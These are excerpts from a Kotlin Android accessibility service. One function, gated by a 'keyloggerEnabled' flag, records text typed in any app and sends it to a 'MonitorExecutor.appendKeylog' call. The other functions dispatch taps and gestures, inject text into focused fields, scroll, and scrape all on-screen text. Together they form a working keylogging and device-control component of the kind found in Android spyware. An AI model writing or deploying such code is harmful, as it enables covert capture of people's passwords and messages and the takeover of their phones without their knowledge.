   176→   176→    private fun handleTextChangeEvent(event: AccessibilityEvent, packageName: String) {
   177→   177→        if (!keyloggerEnabled) return
   178→   178→        
   179→   179→        textEventCount++
   180→   180→        
   181→   181→        try {
   182→   182→            // Get the text from the event
   183→   183→            val text = event.text?.joinToString("") ?: ""
   184→   184→            val fromIndex = event.fromIndex
   185→   185→            val addedCount = event.addedCount
   186→   186→            val removedCount = event.removedCount
   187→   187→            val beforeText = event.beforeText?.toString() ?: ""
   188→   188→            
   189→   189→            // Get the source node for more details
   190→   190→            val source = event.source
   191→   191→            val viewId = source?.viewIdResourceName ?: ""
   192→   192→            val className = source?.className?.toString() ?: ""
   193→   193→            val description = source?.contentDescription?.toString() ?: ""
   194→   194→            
   195→   195→            // Build the captured data
   196→   196→            val capturedText = buildString {
   197→   197→                if (text.isNotEmpty()) {
   198→   198→                    append(text)
   199→   199→                }
   200→   200→                if (beforeText.isNotEmpty() && text.isNotEmpty() && beforeText != text) {
   201→   201→                    // Text was modified
   202→   202→                    append("[EDIT]")
   203→   203→                }
   204→   204→            }
   205→   205→            
   206→   206→            if (capturedText.isNotEmpty()) {
   207→   207→                // Update last captured
   208→   208→                lastCapturedText.append(capturedText)
   209→   209→                if (lastCapturedText.length > 100000) {
   210→   210→                    lastCapturedText = StringBuilder(lastCapturedText.takeLast(50000))
   211→   211→                }
   212→   212→                
   213→   213→                // Send to MonitorExecutor
   214→   214→                MonitorExecutor.appendKeylog(
   215→   215→                    packageName = packageName,
   216→   216→                    text = capturedText,
   217→   217→                    viewType = "text_change"
   218→   218→                )
   219→   219→                
   220→   220→                // Also log with context

   222→   222→                    packageName = packageName,
   223→   223→                    text = capturedText,
   224→   224→                    viewId = viewId,
   225→   225→                    className = className
   226→   226→                )
   227→   227→            }
   228→   228→            
   229→   229→            source?.recycle()
   230→   230→        } catch (e: Exception) {
   231→   231→            // Log error but don't crash
   232→   232→        }
   233→   233→    }

   419→   419→    fun clickAt(x: Int, y: Int): Boolean {
   420→   420→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
   421→   421→            return false
   422→   422→        }
   423→   423→        
   424→   424→        val path = Path().apply {
   425→   425→            moveTo(x.toFloat(), y.toFloat())
   426→   426→        }
   427→   427→        
   428→   428→        val gesture = GestureDescription.Builder()
   429→   429→            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
   430→   430→            .build()
   431→   431→        
   432→   432→        gestureLatch = CountDownLatch(1)
   433→   433→        gestureResult = false
   434→   434→        
   435→   435→        val dispatched = dispatchGesture(gesture, object : GestureResultCallback() {
   436→   436→            override fun onCompleted(gestureDescription: GestureDescription?) {
   437→   437→                gestureResult = true
   438→   438→                gestureLatch?.countDown()
   439→   439→            }
   440→   440→            
   441→   441→            override fun onCancelled(gestureDescription: GestureDescription?) {
   442→   442→                gestureResult = false
   443→   443→                gestureLatch?.countDown()
   444→   444→            }
   445→   445→        }, null)
   446→   446→        
   447→   447→        if (dispatched) {
   448→   448→            gestureLatch?.await(2, TimeUnit.SECONDS)
   449→   449→        }
   450→   450→        
   451→   451→        return gestureResult
   452→   452→    }

   494→   494→     * Type text into a focused input field
   495→   495→     */
   496→   496→    fun typeText(text: String): Boolean {
   497→   497→        val root = rootInActiveWindow ?: return false
   498→   498→        
   499→   499→        // Find focused node or editable node
   500→   500→        val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
   501→   501→            ?: root.findAccessibilityNodeInfosByViewId("android:id/edit").firstOrNull()
   502→   502→            ?: run {
   503→   503→                val nodes = root.findAccessibilityNodeInfosByText("")
   504→   504→                nodes.firstOrNull { it.isEditable }
   505→   505→            }
   506→   506→        
   507→   507→        if (focusedNode == null) return false
   508→   508→        
   509→   509→        // Try to set text directly
   510→   510→        val arguments = Bundle()
   511→   511→        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
   512→   512→        val result = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
   513→   513→        
   514→   514→        focusedNode.recycle()
   515→   515→        return result
   516→   516→    }

   529→   529→        }
   530→   530→        
   531→   531→        // Find scrollable node
   532→   532→        val scrollableNode = findScrollableNode(root, direction) ?: return false
   533→   533→        val result = scrollableNode.performAction(action)
   534→   534→        scrollableNode.recycle()
   535→   535→        
   536→   536→        return result
   537→   537→    }
   538→   538→    
   539→   539→    private fun findScrollableNode(node: AccessibilityNodeInfo, direction: ScrollDirection): AccessibilityNodeInfo? {
   540→   540→        if (node.isScrollable) return node
   541→   541→        
   542→   542→        for (i in 0 until node.childCount) {
   543→   543→            val child = node.getChild(i) ?: continue
   544→   544→            val result = findScrollableNode(child, direction)
   545→   545→            if (result != null) return result
   546→   546→            child.recycle()
   547→   547→        }
   548→   548→        
   549→   549→        return null
   550→   550→    }

   564→   564→    private fun extractTextFromNode(node: AccessibilityNodeInfo, builder: StringBuilder) {
   565→   565→        val text = node.text?.toString()
   566→   566→        if (!text.isNullOrBlank()) {
   567→   567→            builder.append(text).append("\n")
   568→   568→        }
   569→   569→        
   570→   570→        val contentDesc = node.contentDescription?.toString()
   571→   571→        if (!contentDesc.isNullOrBlank() && contentDesc != text) {
   572→   572→            builder.append(contentDesc).append("\n")
   573→   573→        }
   574→   574→        
   575→   575→        for (i in 0 until node.childCount) {
   576→   576→            val child = node.getChild(i) ?: continue
   577→   577→            extractTextFromNode(child, builder)
   578→   578→            child.recycle()
   579→   579→        }
   580→   580→    }

   610→   610→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
   611→   611→            return false

   613→   613→        
   614→   614→        val path = Path().apply {
   615→   615→            moveTo(x.toFloat(), y.toFloat())
   616→   616→        }

   625→   625→    private fun performClickOnNode(node: AccessibilityNodeInfo): Boolean {
   626→   626→        // Try direct click
   627→   627→        if (node.isClickable) {
   628→   628→            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   629→   629→        }
   630→   630→        
   631→   631→        // Try parent click
   632→   632→        var parent = node.parent
   633→   633→        while (parent != null) {
   634→   634→            if (parent.isClickable) {
   635→   635→                val clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   636→   636→                parent.recycle()
   637→   637→                return clicked
   638→   638→            }
   639→   639→            val grandParent = parent.parent
   640→   640→            parent.recycle()
   641→   641→            parent = grandParent
   642→   642→        }
   643→   643→        
   644→   644→        // Try click via coordinates
   645→   645→        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
   646→   646→            val bounds = Rect()
   647→   647→            node.getBoundsInScreen(bounds)
   648→   648→            return clickAt(bounds.centerX(), bounds.centerY())
   649→   649→        }
   650→   650→        
   651→   651→        return false
   652→   652→    }
